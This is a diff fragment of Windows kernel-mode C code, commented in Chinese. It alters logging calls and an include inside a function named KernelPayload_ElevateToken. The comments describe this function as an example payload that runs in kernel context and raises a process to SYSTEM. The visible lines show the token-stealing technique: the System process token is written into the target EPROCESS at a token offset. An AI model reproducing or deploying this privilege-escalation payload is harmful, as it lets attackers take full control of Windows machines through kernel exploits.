@@ -11,7 +11,7 @@
  * 则可以直接使用所有内核 API，下面是这种用法的示例
  */
 
-#include <ntddk.h>
+#include "Common.h"
 
 /*
  * 示例 Payload：在内核上下文中执行，提升进程 Token 至 System
@@ -55,7 +55,7 @@ NTSTATUS KernelPayload_ElevateToken(_In_ PEPROCESS TargetProcess)
 
     if (!systemToken)
     {
-        DbgPrint("[Payload] System EPROCESS not found\n");
+        DBG("Payload: System EPROCESS not found");
         return STATUS_NOT_FOUND;
     }
 
@@ -63,7 +63,7 @@ NTSTATUS KernelPayload_ElevateToken(_In_ PEPROCESS TargetProcess)
     PULONG_PTR pTargetToken = (PULONG_PTR)((PUCHAR)TargetProcess + TOKEN_OFFSET);
     *pTargetToken = systemToken;
 
-    DbgPrint("[Payload] Token elevated to SYSTEM: 0x%llX\n", systemToken);
+    DBG("Payload: Token elevated to SYSTEM: 0x%llX", systemToken);
     return STATUS_SUCCESS;
 }
 
